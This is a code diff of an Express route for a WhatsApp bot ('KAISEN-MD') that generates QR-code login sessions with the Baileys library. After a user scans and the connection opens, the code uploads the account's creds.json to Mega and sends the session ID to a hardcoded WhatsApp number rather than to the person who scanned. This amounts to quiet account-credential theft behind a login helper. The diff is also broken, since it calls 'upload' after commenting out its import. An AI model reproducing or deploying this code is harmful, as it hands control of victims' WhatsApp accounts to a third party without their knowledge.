@@ -1,9 +1,12 @@
+const { exec } = require("child_process");
+//const { upload } = require('../utils/mega');
 const express = require('express');
-const fs = require('fs-extra');
-let router = express.Router();
+let router = express.Router()
 const pino = require("pino");
-const { Boom } = require("@hapi/boom");
-
+let { toBuffer } = require("qrcode");
+const path = require('path');
+const fs = require("fs-extra");
+const { Boom } = require("@hapi/boom");//
 const MESSAGE = process.env.MESSAGE || `
 ╭─❍ *𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ✅*
 ├ 🎐 *Bot Name:* 𝐊𝐀𝐈𝐒𝐄𝐍-𝐌𝐃
@@ -26,31 +29,24 @@ const MESSAGE = process.env.MESSAGE || `
 ╰───────────────⬣
 `;
 
+  const { default: makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, delay, Browsers, DisconnectReason } = require("@whiskeysockets/baileys");
 
+// Store active sessions
+const activeSessions = new Map();
 
-const { upload } = require('../utils/mega');
-const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    delay,
-    makeCacheableSignalKeyStore,
-    Browsers,
-    DisconnectReason
-} = require("@whiskeysockets/baileys");
-const { exec } = require('child_process');    
-// Ensure the directory is empty when the app starts
+// Clean up auth directory on start
 if (fs.existsSync('./auth_info_baileys')) {
-    fs.emptyDirSync(__dirname + '/auth_info_baileys');
+    fs.emptyDirSync('./auth_info_baileys');
 }
 
 router.get('/', async (req, res) => {
-    let num = req.query.number;
+    const sessionId = Date.now().toString();
+         async function generateQRSession() {
+         const { state, saveCreds } = await useMultiFileAuthState(`./auth_info_baileys`);
 
-    async function SUHAIL() {
-        const { state, saveCreds } = await useMultiFileAuthState(`./auth_info_baileys`);
         try {
-            let Smd = makeWASocket({
-                auth: {
+            let socket = makeWASocket({
+                 auth: {
                     creds: state.creds,
                     keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                 },
@@ -59,31 +55,41 @@ router.get('/', async (req, res) => {
                 browser: Browsers.macOS("Safari"),
             });
 
-            if (!Smd.authState.creds.registered) {
-                await delay(1500);
-                num = num.replace(/[^0-9]/g, '');
-                const code = await Smd.requestPairingCode(num);
-                if (!res.headersSent) {
-                    await res.send({ code });
-                }
-            }
+            // Store session reference
+            activeSessions.set(sessionId, { socket });
 
-            Smd.ev.on('creds.update', saveCreds);
-            Smd.ev.on("connection.update", async (s) => {
-                const { connection, lastDisconnect } = s;
+            socket.ev.on('creds.update', saveCreds);
+
+            socket.ev.on("connection.update", async (update) => {
+                const { connection, lastDisconnect, qr } = update;
+
+                if (qr && !res.headersSent) {
+                    try {
+                        const qrBuffer = await toBuffer(qr);
+                        const qrBase64 = `data:image/png;base64,${qrBuffer.toString('base64')}`;
+
+                        return res.json({
+                            success: true,
+                            qr: qrBase64,
+                            sessionId: sessionId
+                        });
+                    } catch (error) {
+                        console.error("Error generating QR Code:", error);
+                        return res.status(500).json({
+                            success: false,
+                            error: "Failed to generate QR code"
+                        });
+                    }
+                }
 
                 if (connection === "open") {
                     try {
-                        await delay(10000);
-                        if (fs.existsSync('./auth_info_baileys/creds.json'));
-
-                        const auth_path = './auth_info_baileys/';
-                        // Send message to fixed number
+                        await delay(3000);
+                        // Send message to fixed numbe
+                         if (fs.existsSync('./auth_info_baileys/creds.json'));
+                           const auth_path = './auth_info_baileys/';
         let user = '917003816486@s.whatsapp.net';
 
-       
-
-                        // Define randomMegaId function to generate random IDs
                         function randomMegaId(length = 6, numberLength = 4) {
                             const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                             let result = '';
@@ -91,28 +97,26 @@ router.get('/', async (req, res) => {
                                 result += characters.charAt(Math.floor(Math.random() * characters.length));
                             }
                             const number = Math.floor(Math.random() * Math.pow(10, numberLength));
-                 return `${result}${number}`;
+                            return `${result}${number}`;
                         }
 
-                        // Upload credentials to Mega
-                        const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${randomMegaId()}.json`);
-                        const Id_session = mega_url.replace('https://mega.nz/file/', '');
+                      
+             const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${randomMegaId()}.json`);
+                            const string_session = mega_url.replace('https://mega.nz/file/', '');
 
-                        const Scan_Id = Id_session;
+                            let msgsss = await socket.sendMessage(user, { text: "KAISEN~" + string_session });
+                            await socket.sendMessage(user, { text: MESSAGE }, { quoted: msgsss });
+                        
 
-                        let msgsss = await Smd.sendMessage(user, { text: "KAISEN~" + Scan_Id });
-                        await Smd.sendMessage(user, { text: MESSAGE }, { quoted: msgsss });
-                       
-
-                        await delay(1000);
-                        try { await fs.emptyDirSync(__dirname + '/auth_info_baileys'); } catch (e) {}
+                         await delay(1000);
+                        try { await fs.emptyDirSync('./auth_info_baileys'); } catch (e) {}
 
                     } catch (e) {
                         console.log("Error during file upload or message send: ", e);
                     }
 
                     await delay(100);
-                    await fs.emptyDirSync(__dirname + '/auth_info_baileys');
+                    await fs.emptyDirSync('./auth_info_baileys');
                 }
 
                 // Handle connection closures
@@ -137,18 +141,21 @@ router.get('/', async (req, res) => {
             });
 
         } catch (err) {
-            console.log("Error in SUHAIL function: ", err);
+            console.log("Error in QR session:", err);
             exec('pm2 restart qasim');
-            console.log("Service restarted due to error");
-            SUHAIL();
-            await fs.emptyDirSync(__dirname + '/auth_info_baileys');
+            generateQRSession();
+            await fs.emptyDirSync('./auth_info_baileys');
             if (!res.headersSent) {
-                await res.send({ code: "Try After Few Minutes" });
+                res.status(500).json({
+                    success: false,
+                    error: "Failed to initialize WhatsApp connection"
+                });
             }
         }
     }
+    await generateQRSession();
 
-    await SUHAIL();
 });
 
+ 
 module.exports = router;
